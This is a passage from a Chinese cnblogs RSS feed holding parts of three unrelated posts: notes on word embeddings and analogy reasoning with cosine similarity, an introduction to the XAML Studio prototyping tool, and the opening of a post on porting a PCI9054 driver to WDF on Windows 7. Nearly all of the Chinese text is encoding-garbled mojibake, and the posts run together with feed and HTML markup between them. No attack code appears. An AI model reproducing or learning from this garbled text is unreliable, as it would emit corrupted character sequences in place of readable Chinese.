<strong>è¿ç§è¡¨ç¤ºæ¹å¼è½å¤éè¿åéé´çè·ç¦»åº¦éè¯æ±è¯­ä¹ç¸ä¼¼æ§ï¼ä»èæåæ¨¡åççè§£ä¸æ³åè½åï¼åæ¶ä¹é¿åäºç¬ç­ç¼ç ç»´åº¦è¿é«ä¸è¡¨ç¤ºç¨ççé®é¢ã</strong></p>
<p>åè®¾æä»¬è§å®ä½¿ç¨ 300 ç»´çç¹å¾åéæ¥ç¼ç è¯æ±æ¶ï¼æä»¬ä¾¿ç§°è¿ä¸ªç¹å¾åéä¸º<strong>è¯åé</strong>ã<br>
åæ¶ï¼è¿æ ·ä¸ä¸ªä¸ªè¯åéå°±åæ¯âåµå¥âå¨äºè¿æ ·ä¸ä¸ª 300 ç»´çåéç©ºé´éãæä»¥ï¼å½æä»¬å°è¯æ±è¡¨ç¤ºä¸ºä½ç»´è¿ç»­åéï¼å¹¶å°å¶æ å°å°åä¸åéç©ºé´ä¸­è¿è¡å­¦ä¹ ä¸æ¯è¾æ¶ï¼è¿ç§è¡¨ç¤ºæ¹å¼å°±è¢«ç§°ä¸º<strong>è¯åµå¥ï¼embeddingï¼</strong>ã<br>
<img src="https://img2024.cnblogs.com/blog/3708248/202601/3708248-20260116214042988-1040885688.png" alt="image.png" loading="lazy"></p>
<p>æä»¬ä¹åå°±ä¼è¯¦ç»å±å¼å®ç°è¯åµå¥ç¸å³çææ¯åæ¨¡åã<br>
ä¸é¢æä»¬ç®åå±å¼ä¸ä¸è¯åµå¥å®ç°çå¦ä¸é¡¹åºç¨ï¼<strong>ç±»æ¯æ¨ç</strong>ã</p>
<h1 id="2-ä½¿ç¨è¯åµå¥è¿è¡ç±»æ¯æ¨ç">2. ä½¿ç¨è¯åµå¥è¿è¡ç±»æ¯æ¨ç</h1>
<p>å¨æä»¬å®ç°äºè¯åµå¥ï¼å¾å°è¯è¡¨ä¸­è¯æ±çè¯åéè¡¨ç¤ºåï¼æä»¬å¯ä»¥éè¿ä¸ç§æ¹å¼æ¥<strong>è§å¯åéªè¯è¯åµå¥çè¯­ä¹è½å</strong>ï¼å°±æ¯ç±»æ¯æ¨çã<br>
å¨ 2013å¹´ï¼ä¸ç¯åä¸º<a href="https://aclanthology.org/N13-1090.pdf" target="_blank" rel="noopener nofollow">Linguistic Regularities in Continuous Space Word Representations</a>çè®ºæå°±è¯¦ç»å±ç¤ºäºè¯åéè½åæ è¯­è¨ç±»æ¯ç°è±¡çæ°æ®åææ¹æ³ï¼åæ¶ï¼æä»¬ä¹åè¦ä»ç»ç Word2Vec ä¸­ä¹å±ç¤ºäºè¯åéå¯ä»¥å®ç°ç±»æ¯æ¨çã<br>
æ»ä¹,è¯åµå¥ä¸­çç±»æ¯æ¨çéè¿åéè¿ç®éªè¯åå±ç¤ºè¯åéç<strong>è¯­ä¹è§å¾æ§</strong>ï¼æ¢ä½ç°äºè¯åµå¥ç©ºé´ççº¿æ§ç»æï¼ä¹è½ç´è§åæ <strong>æ¨¡åå¯¹è¯­è¨å³ç³»ççè§£è½å</strong>ã</p>
<p>åæ ·ç¨ä¸å¥è¯ç®åæ¦æ¬ä¸ä¸ï¼ç±»æ¯æ¨çå°±æ¯<strong>éè¿åéè¿ç®åç°è¯æ±é´è¯­ä¹å³ç³»</strong>ï¼æ¯å¦âå½çâç·äºº+å¥³äººâçåâã<br>
å¬å¼è¡¨ç¤ºä¸ºï¼</p>
<p></p><div class="math display">\[\text{vec}_{(king)} - \text{vec}_{(man)} + \text{vec}_{(woman)} \approx \text{vec}_{(queen)}
\]</div><p></p><p>è¿æ¯å ä¸ºè¯åµå¥åéç©ºé´å¯ä»¥ææ<strong>è¯­ä¹æ¹å</strong>ï¼èåç±»å³ç³»çåéå·®å ä¹å¹³è¡ï¼å æ­¤éè¿åéè¿ç®å°±å¯ä»¥âä¸¾ä¸åä¸âï¼æä»¬ä¾¿å¯ä»¥ç±æ­¤éªè¯è¯åµå¥çè¯­ä¹è½åæ¯å¦åçã<br>
ç®åå±å¼ä¸ä¸ï¼<br>
<img src="https://img2024.cnblogs.com/blog/3708248/202601/3708248-20260116213946398-372809404.png" alt="image.png" loading="lazy"><br>
å æ­¤ï¼ä½ ä¼åç°ï¼è¿é¨åè®¡ç®ï¼</p>
<p></p><div class="math display">\[\text{vec}_{(king)} - \text{vec}_{(man)} + \text{vec}_{(woman)} 
\]</div><p></p><p><strong>å®éä¸ï¼æ¯è®©âå½çâæ²¿çâç·äººâå¥³äººâçè¯­ä¹æ¹åå¹³ç§»ï¼ä»¥æ­¤æ¥å¾å°ä¸ä¸ªç®æ åéï¼å¦æè¯åµå¥åçï¼é£ä¹è¿ä¸ªåéå°±ä¼æåè¯­ä¹ä¸ææ¥è¿âçåâçä½ç½®ã</strong></p>
<p>å°è¿éï¼æä»¬å°±å¾å°äºå¨ç·äººå¯¹åºå¥³äººçç»´åº¦ä¸ï¼å½çæå¯¹åºçç®æ åéã<br>
ä½æ¯å°è¿éè¿æ²¡æç»æï¼æä»¬è¿å·®ä¸æ­¥ï¼<strong>é£å°±æ¯æ¾å°å¨è¯­ä¹ä¸è·ç¦»ç®æ åéæè¿çè¯åéï¼å¾å°ç±»æ¯ç»æã</strong><br>
å æ­¤ï¼æä»¬ä¸ä¸æ­¥çå·¥ä½å°±æ¯<strong>å°ç®æ åéä¸è¯è¡¨ä¸­ææè¯åééä¸ªè®¡ç®ç¸ä¼¼åº¦ï¼åéåç¸ä¼¼åº¦æé«çè¯ä½ä¸ºé¢æµç»æã</strong></p>
<p>å¦ä½è®¡ç®ç¸ä¼¼åº¦ï¼ä½ å¯è½ä¼æ³å°æä»¬å¸¸ç¨çæ¬§æ°è·ç¦»ã</p>
<p></p><div class="math display">\[d(\vec{x}, \vec{y}) = |\vec{x} - \vec{y}|  
= \sqrt{\sum_{i=1}^{d} (x_i - y_i)^2}  
\]</div><p></p><p>ç¶èï¼<strong>å¨è¯åµå¥ç©ºé´ä¸­ï¼ç´æ¥ä½¿ç¨æ¬§æ°è·ç¦»å¹¶ä¸æ¯ä¸ä¸ªçæ³çéæ©</strong>ã<br>
è¿æ¯å ä¸ºæ¬§æ°è·ç¦»åæ¶åå°<strong>åéæ¹å</strong>å<strong>åéé¿åº¦</strong>çå½±åï¼è½ç¶è¯åéç»´åº¦ç¸åï¼ä½è®­ç»ç®æ å¹¶ä¸ä¼çº¦æä¸åè¯åéçé¿åº¦ä¸è´ãç±äºè¯é¢ãæ¢¯åº¦æ´æ°æ¬¡æ°åä¼åè·¯å¾çå·®å¼ï¼ä¸åè¯åéçèæ°å¾å¾ä¸åï¼èè¿äº<strong>é¿åº¦å·®å¼å¹¶ä¸ä¸å®å¯¹åºè¯­ä¹å·®å¼</strong>ã<br>
å¬èµ·æ¥å¾å¤æï¼æ¥ä¸¾ä¸ªä¾å­ççï¼<br>
<img src="https://img2024.cnblogs.com/blog/3708248/202601/3708248-20260116213946144-1939476227.png" alt="image.png" loading="lazy"></p>
<p>æ¢å¥è¯è¯´ï¼å¨è¯­ä¹ä¸éå¸¸æ¥è¿çä¸¤ä¸ªè¯åéï¼å¯è½åªæ¯å ä¸ºé¿åº¦ä¸åï¼å¨æ¬§æ°è·ç¦»ä¸è¢«å¤å®ä¸ºâç¸è·è¾è¿âï¼ä»èå¹²æ°ç±»æ¯æ¨ççç»æã<br>
ç¸æ¯ä¹ä¸ï¼æä»¬æ´å³å¿çæ¯ï¼  <strong>ç®æ åéä¸æä¸ªè¯åéå¨è¯­ä¹æ¹åä¸æ¯å¦ä¸è´ã</strong><br>
è¿æ­£æ¯<strong>ä½å¼¦ç¸ä¼¼åº¦ï¼Cosine Similarityï¼</strong> æåº¦éçåå®¹ã<br>
ä½å¼¦ç¸ä¼¼åº¦éè¿è®¡ç®ä¸¤ä¸ªåéå¤¹è§çä½å¼¦å¼ï¼æ¥è¡¡éå®ä»¬å¨æ¹åä¸çä¸è´ç¨åº¦ï¼å¶å®ä¹ä¸ºï¼<br>
å¶å®ä¹ä¸ºï¼</p>
<p></p><div class="math display">\[\cos(\theta) = \frac{\vec{x} \cdot \vec{y}}{|\vec{x}|  |\vec{y}|}  
= \frac{\sum_{i=1}^{d} x_i y_i}{\sqrt{\sum_{i=1}^{d} x_i^2}  \sqrt{\sum_{i=1}^{d} y_i^2}}  
\]</div><p></p><p>å¶ä¸­ï¼<span class="math inline">\(\vec{x} \cdot \vec{y}\)</span> è¡¨ç¤ºåéçç¹ç§¯ï¼<span class="math inline">\(|\vec{x}|\)</span> ä¸ <span class="math inline">\(|\vec{y}|\)</span> åå«è¡¨ç¤ºåéçæ¬§å éå¾èæ°ï¼åéåç»´åº¦å¹³æ¹åçå¼æ¹ï¼ã<br>
å¯ä»¥çå°ï¼<strong>ä½å¼¦ç¸ä¼¼åº¦å¨è®¡ç®è¿ç¨ä¸­å¯¹åéè¿è¡äºé¿åº¦å½ä¸å</strong>ï¼å æ­¤æç»çç»æåªä¸ä¸¤ä¸ªåéä¹é´çå¤¹è§æå³ï¼èä¸å®ä»¬çç»å¯¹é¿åº¦æ å³ã</p>
<p>ä»å ä½è§åº¦æ¥çï¼ä½å¼¦ç¸ä¼¼åº¦å®éä¸åç­çæ¯è¿æ ·ä¸ä¸ªé®é¢ï¼ <strong>âè¿ä¸¤ä¸ªåéæåçæ¹åæå¤ä¸è´ï¼â</strong><br>
å½ä¸¤ä¸ªåéæ¹åå®å¨ä¸è´æ¶ï¼å¤¹è§ <span class="math inline">\(\theta = 0^\circ\)</span>ï¼æ­¤æ¶ <span class="math inline">\(\cos(\theta)=1\)</span>ã<br>
å½ä¸¤ä¸ªåéæ­£äº¤æ¶ï¼<span class="math inline">\(\theta = 90^\circ\)</span>ï¼<span class="math inline">\(\cos(\theta)=0\)</span>ã<br>
èå½ä¸¤ä¸ªåéæ¹åç¸åæ¶ï¼<span class="math inline">\(\theta = 180^\circ\)</span>ï¼<span class="math inline">\(\cos(\theta)=-1\)</span>ã<br>
è¿ä¸æä»¬å¨è¯åµå¥ä¸­çç´è§æ¯é«åº¦ä¸è´çï¼  å¦æä¸¤ä¸ªè¯å¨è¯­ä¹ç©ºé´ä¸­è¡¨è¾¾çæ¯<strong>ç¸ä¼¼æç¸å³çå«ä¹</strong>ï¼é£ä¹å®ä»¬çåéåºå½æåç¸è¿çæ¹åï¼èè¯­ä¹æ å³çè¯ï¼å¶åéæ¹åå¾å¾æ¥è¿æ­£äº¤ã</p>
<p>æä»¬ä»ç¶ç¨åé¢çä¾å­åæ¥æ¼ç¤ºä¸ä¸ï¼</p>
<p></p><div class="math display">\[\vec{v}_{target} = [1, 3] ï¼ \vec{v}_{queen} = [10, 30]  
\]</div><p></p><p>æ¾ç¶ï¼è¿ä¸¤ä¸ªåéæ¹åå®å¨ä¸è´ï¼ä»é¿åº¦ä¸åã<br>
è®¡ç®å®ä»¬çä½å¼¦ç¸ä¼¼åº¦ï¼</p>
<p></p><div class="math display">\[\cos(\theta) = \frac{1 \times 10 + 3 \times 30}{\sqrt{1^2 + 3^2} \cdot \sqrt{10^2 + 30^2}}  
= \frac{100}{\sqrt{10} \cdot \sqrt{1000}} = 1  
\]</div><p></p><p>å¯ä»¥çå°ï¼å°½ç®¡ä¸¤ä¸ªåéå¨æ¬§æ°è·ç¦»ä¸âç¸è·å¾è¿âï¼ä½å¨ä½å¼¦ç¸ä¼¼åº¦çåº¦éä¸ï¼å®ä»¬è¢«æ­£ç¡®å°å¤å®ä¸º<strong>è¯­ä¹æ¹åå®å¨ä¸è´</strong>ã<br>
å æ­¤ï¼å¨è¯åµå¥çç±»æ¯æ¨çä»»å¡ä¸­ï¼æä»¬éå¸¸éç¨<strong>ä½å¼¦ç¸ä¼¼åº¦</strong>æ¥è¡¡éç®æ åéä¸è¯è¡¨ä¸­åä¸ªè¯åéä¹é´çæ¥è¿ç¨åº¦ï¼ä»èéåè¯­ä¹ä¸æåççé¢æµç»æã</p>
<p><strong>æä»¬ä¼å¨ä¹åçè¯åµå¥æ¨¡åä¸­åå±å¼ä¸ºä»ä¹æäºè¯åéçé¿åº¦å¾å¤§ï¼èé¿åº¦åä»£è¡¨äºä»ä¹ã</strong><br>
ç±æ­¤ï¼æä»¬å®æäºä½¿ç¨è¯åµå¥æ¥è¿è¡ç±»æ¯æ¨ççè¿ç¨ï¼è¿ä¸ä»æ¯è¯åµå¥çä¸é¡¹åºç¨ï¼æä»¬ä¹å¯ä»¥ç¨å®æ¥æ£éªè¯åµå¥æ¨¡åå¯¹è¯­ä¹ççè§£è½åã</p>
<h1 id="3-æ»ç»">3. æ»ç»</h1>
<table>
<thead>
<tr>
<th>æ¦å¿µ</th>
<th>åç</th>
<th>æ¯å»</th>
</tr>
</thead>
<tbody>
<tr>
<td>è¯æ±è¡¨å¾</td>
<td>å°è¯æ±è¡¨ç¤ºä¸ºå¤ç»´è¿ç»­åéï¼è¯åé/embeddingï¼ï¼ä»¥ä¾¿æ¨¡åè®¡ç®åæ¯è¾ã</td>
<td>è¯æ±ååµå¥å¨é«ç»´ç©ºé´éçç¹ï¼è·ç¦»åæ è¯­ä¹ç¸ä¼¼æ§ã</td>
</tr>
<tr>
<td>ç¬ç­ç¼ç ï¼One-hotï¼</td>
<td>æ¯ä¸ªè¯ç¨é«ç»´ç¨çåéè¡¨ç¤ºï¼åéé´äºç¸æ­£äº¤ã</td>
<td>æ¯ä¸ªè¯å­¤ç«å­å¨ï¼è¹æåæ©å­ãç·äººåå¥³äººæ²¡æèç³»ã</td>
</tr>
<tr>
<td>è¯åµå¥ï¼Embeddingï¼</td>
<td>å°è¯åéæ å°å°åä¸åéç©ºé´è¿è¡å­¦ä¹ åæ¯è¾ï¼ä½ç»´ãè¿ç»­ãå¯åº¦éç¸ä¼¼æ§ã</td>
<td>åæé«ç»´è¯æ±ç©ºé´âåç¼©âæä¸ä¸ªè¿ç»­ç©ºé´ï¼è¯è¯­é´è·ç¦»åæ è¯­ä¹ã</td>
</tr>
<tr>
<td>ç±»æ¯æ¨ç</td>
<td>éè¿åéè¿ç®åç°è¯æ±é´è¯­ä¹å³ç³»ï¼å¬å¼ï¼<span class="math inline">\(\vec{king}-\vec{man}+\vec{woman}\approx \vec{queen}\)</span></td>
<td>å½çæ²¿âç·äººâå¥³äººâçè¯­ä¹æ¹åå¹³ç§»ï¼æåçåã</td>
</tr>
<tr>
<td>ç¸ä¼¼åº¦è®¡ç®</td>
<td>æ¬§æ°è·ç¦»ååéé¿åº¦å½±åï¼å¯è½è¯¯å¤è¯­ä¹ï¼ä½å¼¦ç¸ä¼¼åº¦åªçåéæ¹å</td>
<td>æ¹åä¸è´çåéè¢«å¤å®è¯­ä¹ç¸è¿ï¼å³ä½¿é¿åº¦ä¸åã</td>
</tr>
<tr>
<td>ä½å¼¦ç¸ä¼¼åº¦</td>
<td>$$\cos(\theta) = \frac{\vec{x} \cdot \vec{y}}{|\vec{x}| , |\vec{y}|}$$</td>
<td>ä¸¤ä¸ªåéæ¹åä¸è´å°±åç®­å¤´æåç¸åæ¹åï¼å³ä½¿ç®­å¤´é¿ç­ä¸åä¹ä¸æ ·ã</td>
</tr>
<tr>
<td>åéé¿åº¦</td>
<td>ä¸»è¦åè¯é¢ãæ¢¯åº¦ç´¯è®¡ç­è®­ç»å ç´ å½±åï¼ä¸ç´æ¥å¯¹åºè¯­ä¹ã</td>
<td>é¿åº¦å¤§ä¸ä»£è¡¨æ´âéè¦âï¼æ¹åæå³å®è¯­ä¹å³ç³»ã</td>
</tr>
<tr>
<td>å¯è§åï¼t-SNEï¼</td>
<td>å°é«ç»´è¯åéæ å°å°2D/3Då¹³é¢ï¼å°½éä¿çå±é¨ç¸ä¼¼å³ç³»ã</td>
<td>åæé«ç»´ç©ºé´âæå¹³âï¼æ¹ä¾¿è§å¯è¯è¯­é´è·ç¦»ã</td>
</tr>
</tbody>
</table>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-01-16 21:42">2026-01-16 21:41</span>&nbsp;
<a href="https://www.cnblogs.com/Goblinscholar">å¥å¸æå­¦è</a>&nbsp;
éè¯»(<span id="post_view_count">14</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19494158);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19494158', targetLink: 'https://www.cnblogs.com/Goblinscholar/p/19494158', title: 'å´æ©è¾¾æ·±åº¦å­¦ä¹ è¯¾ç¨äºï¼èªç¶è¯­è¨å¤ç  ç¬¬äºå¨ï¼è¯åµå¥ï¼ä¸ï¼è¯æ±è¡¨å¾åç±»æ¯æ¨ç' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ ä¸æ¬¾ä¸ä¸º WinUI XAML è®¾è®¡çå¿«éååè®¾è®¡å·¥å·ï¼çæçä»£ç å¯è½»æ¾å¤å¶å°Visual Studioä¸­ï¼ ]]></title>
    <link>https://www.cnblogs.com/Can-daydayup/p/19494169</link>
    <guid>fb6fb0b753cc69a47bc1e88c0c6deac5</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/Can-daydayup/p/19494169" title="åå¸äº 2026-01-16 21:38">
    <span role="heading" aria-level="2">ä¸æ¬¾ä¸ä¸º WinUI XAML è®¾è®¡çå¿«éååè®¾è®¡å·¥å·ï¼çæçä»£ç å¯è½»æ¾å¤å¶å°Visual Studioä¸­ï¼</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body blogpost-body-html">
<h2 data-tool="mdniceç¼è¾å¨"><span>åè¨</span></h2>
<p data-tool="mdniceç¼è¾å¨"><span>ä»å¤©å¤§å§ç»å¤§å®¶åäº«ä¸æ¬¾ä¸ä¸º WinUI XAML è®¾è®¡çå¿«éååè®¾è®¡å·¥å·ï¼çæçä»£ç å¯è½»æ¾å¤å¶å° Visual Studio ä¸­ï¼<strong>XAML Studio</strong><span>ã</span></span></p>
<h2 data-tool="mdniceç¼è¾å¨"><span>XAML Studio å·¥å·ä»ç»</span></h2>
<p data-tool="mdniceç¼è¾å¨"><span>XAML Studio æ¯ä¸æ¬¾ä¸ä¸º WinUI XAML è®¾è®¡çå¿«éååè®¾è®¡å·¥å·ï¼åºäº C# å¼æºï¼MIT licenseï¼ï¼çæçä»£ç å¯è½»æ¾å¤å¶å° Visual Studio ä¸­çåºç¨ä¸­ãXAML Studio è®©ä½ å®æ¶é¢è§ XAML ä»£ç ï¼å¹¶ä¸ç»æäºå¨ï¼å°±åå®å¨ä½ èªå·±çåºç¨ä¸­è¿è¡ä¸æ ·ã</span></p>
<p><img src="https://img2024.cnblogs.com/blog/1336199/202601/1336199-20260116213613167-245037706.png" alt="image" loading="lazy"></p>
<h2 data-tool="mdniceç¼è¾å¨"><span>WinUI ä»ç»</span></h2>
<p data-tool="mdniceç¼è¾å¨"><span>WinUI æ¯ä¸ä¸ªç°ä»£ UI æ¡æ¶ï¼æ¥æä¸°å¯çæ§ä»¶åæ ·å¼ï¼ç¨äºæå»ºå¨æä¸é«æ§è½ç Windows åºç¨ç¨åºã</span></p>
<ul class="list-paddingleft-1">
<li><a href="https://github.com/microsoft/microsoft-ui-xaml" target="_blank" rel="noopener nofollow"><span>https://github.com/microsoft/microsoft-ui-xaml</span></a></li>
</ul>
<p><img src="https://img2024.cnblogs.com/blog/1336199/202601/1336199-20260116213633580-546817572.png" alt="image" loading="lazy"></p>
<h2 data-tool="mdniceç¼è¾å¨"><span>åºç¨åºæ¯</span></h2>
<ul class="list-paddingleft-1">
<li><strong>çé¢è°è¯ä¸ä¼åï¼</strong><span>&nbsp;éè¿åç½®çè°è¯å·¥å·åæ°æ®ä¸ä¸æç¼è¾å¨ï¼å¼åèå¯ä»¥å®æ¶è°è¯åä¼åçé¢ã</span></li>
<li><strong>å­¦ä¹ ä¸æå­¦ï¼</strong><span>&nbsp;å¯¹äºåå­¦èï¼XAML Studio æä¾äºä¸ä¸ªä½é¨æ§çå¹³å°æ¥å­¦ä¹ åå®è·µ WinUI XAML å¼åã</span></li>
<li><strong>å¿«éååè®¾è®¡ï¼</strong><span>&nbsp;å¼åèå¯ä»¥å©ç¨ XAML Studio å¿«éæå»ºåæµè¯ XAML çé¢ï¼æ éå¨ Visual Studio ä¸­å®æ´æå»ºåºç¨ç¨åºã</span></li>
</ul>
<h2 data-tool="mdniceç¼è¾å¨"><span>åè½ç¹ç¹</span></h2>
<p data-tool="mdniceç¼è¾å¨"><span>å®æ¶ç¼è¾ä¸äº¤äºãç»å®è°è¯å¨ãæ°æ®ä¸ä¸æç¼è¾å¨ãèªå¨ä¿å­å¹¶æ¢å¤ææ¡£ãæºè½æç¥ï¼IntelliSenseï¼ãææ¡£å·¥å·ç®±ãå¯¹é½è¾å©çº¿ç­ã</span></p>
<h2 data-tool="mdniceç¼è¾å¨"><span>é¡¹ç®æºä»£ç </span></h2>
<p><img src="https://img2024.cnblogs.com/blog/1336199/202601/1336199-20260116213646854-60919217.png" alt="image" loading="lazy"></p>
<h2 data-tool="mdniceç¼è¾å¨"><span>è¿è¡æææ¼ç¤º</span></h2>
<p><img src="https://img2024.cnblogs.com/blog/1336199/202601/1336199-20260116213613167-245037706.png" alt="image" loading="lazy"></p>
<p><img src="https://img2024.cnblogs.com/blog/1336199/202601/1336199-20260116213702498-1564398781.png" alt="image" loading="lazy"></p>
<p><img src="https://img2024.cnblogs.com/blog/1336199/202601/1336199-20260116213708854-2025259760.png" alt="image" loading="lazy"></p>
<p><img src="https://img2024.cnblogs.com/blog/1336199/202601/1336199-20260116213714543-2136022853.png" alt="image" loading="lazy"></p>
<p><img src="https://img2024.cnblogs.com/blog/1336199/202601/1336199-20260116213720682-160742385.png" alt="image" loading="lazy"></p>
<p><img src="https://img2024.cnblogs.com/blog/1336199/202601/1336199-20260116213726638-346653708.png" alt="image" loading="lazy"></p>
<h2 data-tool="mdniceç¼è¾å¨"><span>é¡¹ç®æºç å°å</span></h2>
<p data-tool="mdniceç¼è¾å¨"><span>æ´å¤é¡¹ç®å®ç¨åè½åç¹æ§æ¬¢è¿åå¾é¡¹ç®å¼æºå°åæ¥çðï¼å«å¿äºç»é¡¹ç®ä¸ä¸ªStaræ¯æðã</span></p>
<ul class="list-paddingleft-1">
<li><strong>GitHubå¼æºå°åï¼</strong><a href="https://github.com/dotnet/XAMLStudio" target="_blank" rel="noopener nofollow"><span>https://github.com/dotnet/XAMLStudio</span></a></li>
</ul>
<h2 data-tool="mdniceç¼è¾å¨"><span>ä¼ç§é¡¹ç®åæ¡æ¶ç²¾é</span></h2>
<p data-tool="mdniceç¼è¾å¨"><span>è¯¥é¡¹ç®å·²æ¶å½å°C#/.NET/.NET Coreä¼ç§é¡¹ç®åæ¡æ¶ç²¾éä¸­ï¼å³æ³¨ä¼ç§é¡¹ç®åæ¡æ¶ç²¾éè½è®©ä½ åæ¶äºè§£C#ã.NETå.NET Coreé¢åçææ°å¨æåæä½³å®è·µï¼æé«å¼åå·¥ä½æçåè´¨éãåå·²æï¼æ¬¢è¿å¤§å®¶è¸è·æäº¤PRæ¨èæèªèï¼<strong>è®©ä¼ç§çé¡¹ç®åæ¡æ¶ä¸è¢«åæ²¡ð¤</strong><span>ï¼ã</span></span></p>
<ul class="list-paddingleft-1">
<li><strong>GitHubå¼æºå°åï¼</strong><a href="https://github.com/YSGStudyHards/DotNetGuide/blob/main/docs/DotNet/DotNetProjectPicks.md" target="_blank" rel="noopener nofollow"><span>https://github.com/YSGStudyHards/DotNetGuide/blob/main/docs/DotNet/DotNetProjectPicks.md</span></a></li>
<li><strong>Giteeå¼æºå°åï¼</strong><a href="https://gitee.com/ysgdaydayup/DotNetGuide/blob/main/docs/DotNet/DotNetProjectPicks.md" target="_blank" rel="noopener nofollow"><span>https://gitee.com/ysgdaydayup/DotNetGuide/blob/main/docs/DotNet/DotNetProjectPicks.md</span></a></li>
</ul>
<div id="gtx-trans" style="position: absolute; left: 35px; top: 892.062px">&nbsp;</div>
</div>
<div id="MySignature" role="contentinfo">
    <blockquote>
<p style="font-family:YouYuan;font-size: 16px;margin: 0 auto 0.01em auto;"><span style="font-size: 17px; ">ä½èåç§°ï¼</span><a href="https://www.cnblogs.com/Can-daydayup/" target="_blank">è¿½éæ¶åè</a></p>
<p style="font-family:YouYuan;font-size: 16px;margin: 0 auto 0.01em auto;"><span style="font-size: 17px; ">ä½èç®ä»ï¼</span>ä¸ä¸ªç­ç±ç¼ç¨ãåäºåäº«ãåæ¬¢å­¦ä¹ ãæ¢ç´¢ãå°è¯æ°äºç©åæ°ææ¯çå¨æ è½¯ä»¶å·¥ç¨å¸ã</p>
<p style="font-family:YouYuan;font-size: 16px;margin: 0 auto 0.01em auto;">
æ¬æçæå½ä½èååå®¢å­å±æï¼æ¬¢è¿è½¬è½½ï¼ä½æªç»ä½èåæå¿é¡»ä¿çæ­¤æ®µå£°æï¼ä¸å¨æç« é¡µé¢ææ¾ä½ç½®ç»åºåæé¾æ¥ï¼å¦åä¿çè¿½ç©¶æ³å¾è´£ä»»çæå©ãå¦æè¯¥ç¯æç« å¯¹æ¨æå¸®å©çè¯ï¼å¯ä»¥ç¹ä¸ä¸å³ä¸è§ç<a onclick="votePost(cb_entryId,'Digg')" href="javascript:void(0)" style="color:red;">ãâ¥æ¨èâ¥ã</a>ï¼å¸æè½å¤æç»­çä¸ºå¤§å®¶å¸¦æ¥å¥½çææ¯æç« ï¼æä¸­å¯è½å­å¨æè¿°ä¸æ­£ç¡®çå°æ¹ï¼æ¬¢è¿ææ­£æè¡¥åï¼ä¸èææ¿ã
</p>
</blockquote>
</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-01-16 21:39">2026-01-16 21:38</span>&nbsp;
<a href="https://www.cnblogs.com/Can-daydayup">è¿½éæ¶åè</a>&nbsp;
éè¯»(<span id="post_view_count">32</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19494169);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19494169', targetLink: 'https://www.cnblogs.com/Can-daydayup/p/19494169', title: 'ä¸æ¬¾ä¸ä¸º WinUI XAML è®¾è®¡çå¿«éååè®¾è®¡å·¥å·ï¼çæçä»£ç å¯è½»æ¾å¤å¶å°Visual Studioä¸­ï¼' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ PCI9x5xé©±å¨ç§»æ¤æ¯æPCI9054å¨win7ä¸ä½¿ç¨1 ]]></title>
    <link>https://www.cnblogs.com/haohaoganhuo/p/19493093</link>
    <guid>c9fe5738f4674691c6087ec3329c3550</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/haohaoganhuo/p/19493093" title="åå¸äº 2026-01-16 17:06">
    <span role="heading" aria-level="2">PCI9x5xé©±å¨ç§»æ¤æ¯æPCI9054å¨win7ä¸ä½¿ç¨1</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<p>æ¬é©±å¨æç»ç®çæ¯ä¸ºäºå°åäº¬ä¸­æ³°èåç§ææéå¬å¸çä¸ä¸ªæ°æ®ééå¡èäº§åé©±å¨åçº§æWDFæ¡æ¶çæ°é©±å¨ï¼èé©±å¨ä½¿ç¨Driver Studioå¼åï¼å¨64ä½æä½ç³»ç»ä¸ä¸å¤ç¨³å®ï¼æä»¥è¦åçº§æWDFæ¡æ¶ãåç»­ç¨èäº§åç§°å¼å®éç¡¬ä»¶ï¼èé©±å¨ç§°å¼Driver Studioå¼åçé©±å¨ï¼æ°é©±å¨ç§°å¼WDFæ¡æ¶é©±å¨ã</p>
<p>å¼å§çæ¶åæ³ä½¿ç¨Qoderç´æ¥åæèé©±å¨åèªå¨çæä¸ä¸ªWDFæ¡æ¶é©±å¨ï¼ç»ææ²¡ææåï¼çæ¥å®å¹¶ä¸æ¯ä¸è½ï¼ç¼ç¨è¿ç¨ä¸­ç´æ¥è®©ä»å¸®å¿ç»äºæç¤ºè¿æ¯å¯ä»¥çï¼å¤§å®¶æ³è¦å°è¯Qoderå¯ä»¥å¨å®ç½ä¸è½½ï¼ä¹å¯ä»¥éè¿ä¸é¢é¾æ¥æ³¨åä¸è½½ï¼<br>
<a href="https://qoder.com/referral?referral_code=T0BDuCGlZU9RQTm4FyaG5cVIGi8wWaFX" target="_blank" rel="noopener nofollow">Qoderä¸è½½é¾æ¥</a></p>
<h2 id="ä¿®æ¹ç¤ºä¾ç¨åºæ¯æwindows7">ä¿®æ¹ç¤ºä¾ç¨åºæ¯æWindows7</h2>
<p>å¨âå±æ§-Driver Settings-Target OS versionâè®¾ç½®æwindows7åï¼ç¼è¯æ¥åä¸æ¯æ1.19éè¯¯ï¼æ¹æ1.11æè½æ¯æ</p>
